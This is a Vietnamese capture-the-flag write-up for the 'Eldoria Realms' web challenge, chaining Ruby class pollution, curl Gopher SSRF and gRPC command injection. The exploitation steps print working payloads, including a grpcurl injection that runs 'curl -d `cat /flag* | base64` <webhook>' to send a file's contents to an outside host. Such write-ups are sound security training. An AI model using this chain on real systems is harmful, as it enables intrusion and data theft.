---
layout: post
title: "Eldoria Realms"
date: 2025-03-28 16:31:06 +0700
tags: [CTF, Web, SSRF, gRPC, Command-Injection]
---

# 🎮 Eldoria Realms - Web Challenge

> Author: tan3ora

- **Tên:** Eldoria Realms
- **Description:** A portal that allows players of Eldoria to transport between realms, take on quests, and manage their stats. See if it's possible to break out of the realm to gather more info on Malakar's spells inner workings.
- **Có source code**

---

## 🔍 Phân tích

Trang web có 2 service:

1. Website viết bằng **Ruby**
2. [gRPC Server](https://viblo.asia/p/co-ban-ve-grpc-va-cach-protobuf-ma-hoa-giu-lieu-trong-grpc-yZjJYzBDLOE)

---

### 🚨 Ruby Class Pollution qua merge đệ quy

Khi phân tích source code, ta phát hiện đoạn merge dữ liệu user như sau:

```ruby
class Adventurer
  @@realm_url = "http://eldoria-realm.htb"
  attr_accessor :name, :age, :attributes

  def self.realm_url
    @@realm_url
  end

  def initialize(name:, age:, attributes:)
    @name = name
    @age = age
    @attributes = attributes
  end

  def merge_with(additional)
    recursive_merge(self, additional)
  end

  private

  def recursive_merge(original, additional, current_obj = original)
    additional.each do |key, value|
      if value.is_a?(Hash)
        if current_obj.respond_to?(key)
          next_obj = current_obj.public_send(key)
          recursive_merge(original, value, next_obj)
        else
          new_object = Object.new
          current_obj.instance_variable_set("@#{key}", new_object)
          current_obj.singleton_class.attr_accessor key
        end
      else
        current_obj.instance_variable_set("@#{key}", value)
        current_obj.singleton_class.attr_accessor key
      end
    end
    original
  end
end
```

**Vấn đề:**  
Hàm `recursive_merge` sẽ tự tạo biến instance mới nếu key chưa tồn tại → mở ra khả năng **class pollution**.

**Tại endpoint `/merge-fates`:**

```ruby
post "/merge-fates" do
  content_type :json
  json_input = JSON.parse(request.body.read)
  random_attributes = { ... }

  $player = Player.new(
    name: "Valiant Hero",
    age: 21,
    attributes: random_attributes
  )

  $player.merge_with(json_input)
  { 
    status: "Fates merged", 
    player: { name: $player.name, age: $player.age, attributes: $player.attributes } 
  }.to_json
end
```

→ Ta có thể chỉnh sửa attribute của **superclass**:

**Payload:**
```json
{
  "class": {
    "superclass": {
      "realm_url": "attacker_url"
    }
  }
}
```

**Kết quả:** Mỗi lần truy cập `/connect-realm` → server sẽ gọi `curl attacker_url`.

---

## 🚀 Gopher SSRF → Command Injection gRPC

Trong server gRPC có function:

```go
func healthCheck(ip string, port string) error {
  cmd := exec.Command("sh", "-c", "nc -zv "+ip+" "+port)
  output, err := cmd.CombinedOutput()
  ...
}
```

Kết hợp với Dockerfile:
```
RUN wget https://curl.haxx.se/download/curl-7.70.0.tar.gz ...
```

→ Curl version dễ bị **SSRF Gopher → Raw TCP Injection**

---

## 🧨 Khai thác

**Flow:**  
`Ruby Class Pollution → Curl Gopher SSRF → gRPC Protocol → Command Injection`

### 1. Craft request gRPC

Dùng [grpcurl](https://github.com/fullstorydev/grpcurl):

```bash
grpcurl   -plaintext   -proto ./challenge/live_data.proto   -d '{"ip":";","port":"curl -d `cat /flag* | base64` <link_webhook> "}'   localhost:50051   live.LiveDataService.CheckHealth
```

**Dùng Wireshark → Follow TCP Stream để lấy raw request**

![Follow TCP Stream](http://note.bksec.vn/pad/uploads/12087ecd-b40d-45f7-90f4-64344c2e15fc.png)

---

### 2. Chuyển thành Gopher Payload

Export TCP stream → Python encode:

```python
import urllib.parse

with open("dump_raw1", "rb") as f:
    raw_data = f.read()

encoded_data = urllib.parse.quote_from_bytes(raw_data)
gopher_url = f"gopher://127.0.0.1/_{encoded_data}"

print("Gopher URL:")
print(gopher_url)
```

---

### 3. Thay đổi realm_url

Gửi request đến `/merge-fates`:

```json
{
  "class": {
    "superclass": {
      "realm_url": "gopher://127.0.0.1/_<payload>"
    }
  }
}
```

**Request thành công:**

![Pollution Payload](http://note.bksec.vn/pad/uploads/3d276f00-5528-4a3b-bb5c-377a9904d5f2.png)

---

### 4. Trigger SSRF → Command Injection

Gửi request tới `/connect-realm`:

![Trigger](http://note.bksec.vn/pad/uploads/affde1b9-2f15-4850-b871-f1b481311395.png)

---

### 5. Lấy flag

Payload thực thi lệnh:
```bash
curl -d `cat /flag* | base64` <webhook>
```

Webhook nhận về flag:

![Flag](http://note.bksec.vn/pad/uploads/cd35619e-01c9-4af1-8bde-1089b54ae0f3.png)

---

